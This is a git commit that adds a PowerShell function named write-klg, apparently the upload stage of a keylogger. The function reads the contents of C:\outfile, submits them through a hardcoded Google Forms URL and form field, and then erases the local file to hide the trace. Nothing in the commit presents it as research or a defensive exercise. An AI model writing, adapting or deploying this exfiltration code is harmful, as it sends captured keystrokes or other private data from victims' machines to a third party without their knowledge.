14c1fe2e939909c4a735fa8fde1cb911c79d5604
Tom D'Aquino <35279933+tomlogichub@users.noreply.github.com>
2020-03-07 00:48:40 -0800

    Update and rename upload-klg.ps1 to write-klg.ps1

---
+++ write-klg.ps1
@@ -0,0 +1,10 @@
+function write-klg {
+    $dump = Get-Content -Path C:\outfile -Raw
+    $R = Invoke-WebRequest https://docs.google.com/forms/d/e/1FAIpQLSegeBbud-xkTMry9NILjrx-oqF0-BArDA7L3Mgu9-Z0UUwBEQ/viewform
+    $Form = $R.Forms[0]
+    $Form.fields[entry.474201868] = $dump
+    $Uri = "https://docs.google.com/forms/d/e/1FAIpQLSegeBbud-xkTMry9NILjrx-oqF0-BArDA7L3Mgu9-Z0UUwBEQ/viewform" + $Form.Action
+    $R = Invoke-WebRequest -Uri $Uri -Method POST -Body $Form.Fields
+    Start-Sleep -s 2
+    Clear-Content "C:\outfile"
+}
